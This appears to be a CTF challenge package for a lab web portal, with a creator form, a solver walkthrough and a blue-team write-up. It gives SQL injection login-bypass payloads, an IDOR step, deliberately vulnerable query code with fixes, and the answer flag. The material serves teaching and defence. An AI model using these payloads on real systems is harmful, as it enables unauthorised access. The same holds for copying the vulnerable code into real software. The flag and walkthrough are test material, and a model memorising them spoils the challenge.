# Mission 3 — Digital Turf Breach

## Challenge Creator Form

| Field       | Value |
|-------------|-------|
| **Name**    | Digital Turf Breach |
| **Category**| Web Exploitation + Network Reconnaissance |
| **Difficulty** | Hard |
| **Points**  | 300 |
| **Routes**  | `/login`, `/profile`, `/secure-login`, `/secure-profile`, `/logs-demo` |

### Story / Description

Your team has reached the final stage of Operation Digital Turf War. Intelligence indicates that Atlas Core Systems is running a legacy employee portal on the assigned lab VM.

Start with reconnaissance. Scan the assigned VM to discover the service. Once found, access the login page and test for vulnerabilities. The backend code was written without input validation or authorization checks — two classic mistakes.

Bypass authentication, then look at the URL after login. The profile system trusts a parameter in the URL to determine what data to return — and the backend does not verify whether the authenticated user should have access to that data.

Retrieve the administrator's recovery note to capture the final flag.

**Reconnaissance step:**
```bash
nmap -sV <target-ip>
# Expected: 5000/tcp open http Python/Flask
```

### Vulnerabilities

1. **SQL Injection** — The login form builds SQL queries using string concatenation. User input is injected directly into the query without sanitization.
2. **IDOR / Broken Access Control** — The profile page accepts an `?id=` parameter and returns the corresponding profile without checking whether the authenticated user has permission to view it.

### Attack Payload (SQLi) — Intended Path

The intended path uses a **targeted** injection to log in as the known employee (Maya) without her password. This keeps the IDOR step necessary.

```
Username: maya' --
Password: (anything)
```

Resulting query:
```sql
SELECT * FROM users WHERE username='maya' --' AND password='anything'
-- everything after 'maya' is commented out; password check is skipped
-- Maya's row (id=102, employee) is returned
```

After login, the student sees Maya's normal employee profile at `/profile?id=102`. The IDOR step is still required to reach the admin profile.

### IDOR Step

After login as Maya, observe the URL:
```
/profile?id=102
```
Change the `id` parameter to:
```
/profile?id=1
```
The vulnerable backend returns the admin profile without checking whether Maya is authorized to view it.

### Alternative Payload (Additional Demo Only)

```
Username: ' OR '1'='1' --
Password: (anything)
```

This always-true injection returns the first DB user (admin, id=1) directly. It bypasses authentication **and** skips the IDOR step by landing on the admin profile immediately. Use this only as an additional demonstration after the main path has been completed, to show a different injection technique.

### Flag

```
picoCTF{digital_turf_war_compromised}
```

---

## Challenge Solver Report

### Initial Analysis

The challenge requires network scanning before web exploitation. The target VM is running a Python Flask service on a non-standard port. After discovering the service, the login form is the first attack surface. The username field accepts special characters without sanitization.

### Tools Used

- `nmap` — network scanning and service detection
- Browser — web interaction, URL manipulation
- Burp Suite (optional) — intercept and modify POST requests
- Browser DevTools — inspect request/response
- Terminal

### Exploitation Steps

**Phase 1 — Reconnaissance**

```bash
nmap -sV <target-ip>
```

Expected output:
```
PORT     STATE SERVICE VERSION
5000/tcp open  http    Werkzeug/3.0 Python/3.11
```

**Phase 2 — SQL Injection (Authentication Bypass)**

1. Open `http://<target-ip>:5000/login` in a browser.
2. Enter the following in the username field:
   ```
   maya' --
   ```
3. Enter any string in the password field.
4. Submit the form.
5. The server executes a query that matches Maya's row and ignores the password check.
6. Login succeeds as Maya (id=102, employee role).

**Optional — Burp Suite method:**

1. Set Burp Suite as browser proxy.
2. Send the login POST request.
3. In Burp Repeater, set `username=maya'+--&password=x` (URL-encoded: `maya%27+--`).
4. Observe the redirect response — should redirect to `/profile?id=102`.

**Phase 3 — IDOR (Access the Admin Profile)**

1. After login, the URL shows: `/profile?id=1` (or possibly `?id=102` depending on SQLi result).
2. Manually change the URL to: `http://<target-ip>:5000/profile?id=1`
3. The server returns the admin profile.
4. The "Notes" field contains: `Admin recovery note: picoCTF{digital_turf_war_compromised}`

### Flag Found

```
picoCTF{digital_turf_war_compromised}
```

### Learning Points

- SQL injection remains one of the most critical web vulnerabilities (OWASP A03:2021 — Injection).
- String concatenation in SQL queries is never safe, regardless of how careful the developer tries to be.
- IDOR (Insecure Direct Object Reference) occurs when the backend trusts a user-supplied value to identify a resource without verifying authorization.
- URL parameters are entirely user-controlled. Never use them alone to determine data access.
- The combination of authentication bypass + IDOR demonstrates how chained vulnerabilities escalate impact.
- Logging (visible at `/logs-demo`) captures these attacks — a real defender would alert on these patterns.

---

## Blue Team — Vulnerability Explanation

### Vulnerability 1: SQL Injection

**Root Cause:**
```python
# VULNERABLE — user input concatenated directly into SQL
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
```

The single quote in the payload `' OR '1'='1' --` breaks out of the string literal, injects a new SQL condition, and comments out the rest of the query.

**Fix:**
```python
# SECURE — parameterized query (user input is never part of SQL syntax)
user = db.execute(
    "SELECT * FROM users WHERE username = ?",
    (username,)
).fetchone()
if user and user["password_hash"] == sha256(password):
    # authenticate
```

### Vulnerability 2: IDOR / Broken Access Control

**Root Cause:**
```python
# VULNERABLE — trusts URL parameter, no authorization check
profile_id = request.args.get("id")
user = db.execute("SELECT * FROM profiles WHERE id = ?", (profile_id,)).fetchone()
return render_template("profile.html", profile=user)
```

**Fix:**
```python
# SECURE — server verifies session ownership before returning data
requested_id = request.args.get("id")
if requested_id != str(session["user_id"]) and session["role"] != "admin":
    return "403 Access Denied", 403
```

### Mitigation Summary

| Vulnerability | Root Cause | Fix |
|---------------|------------|-----|
| SQL Injection | String concatenation in query | Parameterized queries |
| Broken Auth | No password hashing | SHA-256 (min); bcrypt in production |
| IDOR | URL parameter trusted for access | Session-based authorization check |
| Info Disclosure | Error shows raw SQL | Generic error messages |
| Brute Force | No rate limiting | 5 attempts / 60 sec per IP |
| Logging | No suspicious event recording | Log all login failures, SQLi, IDOR attempts |

### OWASP References

- **A01:2021 — Broken Access Control** (IDOR)
- **A03:2021 — Injection** (SQL Injection)
- **A07:2021 — Identification and Authentication Failures**
- **A09:2021 — Security Logging and Monitoring Failures**
